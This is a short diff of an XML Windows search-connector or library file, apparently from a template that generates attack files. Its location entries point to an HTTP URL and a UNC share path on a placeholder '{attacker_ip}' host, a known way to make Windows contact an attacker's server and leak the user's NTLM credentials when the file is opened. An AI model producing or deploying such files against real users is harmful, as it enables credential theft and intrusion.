@@ -12,10 +12,10 @@
             <isDefaultSaveLocation>true</isDefaultSaveLocation>
             <isSupported>false</isSupported>
             <simpleLocation>
-                <url>http://{attacker_ip}</url>
+                <url>http://{attacker_ip}/test1</url>
             </simpleLocation>
             <simpleLocation>
-                <url>\\{attacker_ip}\test</url>
+                <url>\\{attacker_ip}\test2</url>
             </simpleLocation>
         </searchConnectorDescription>
     </searchConnectorDescriptionList>
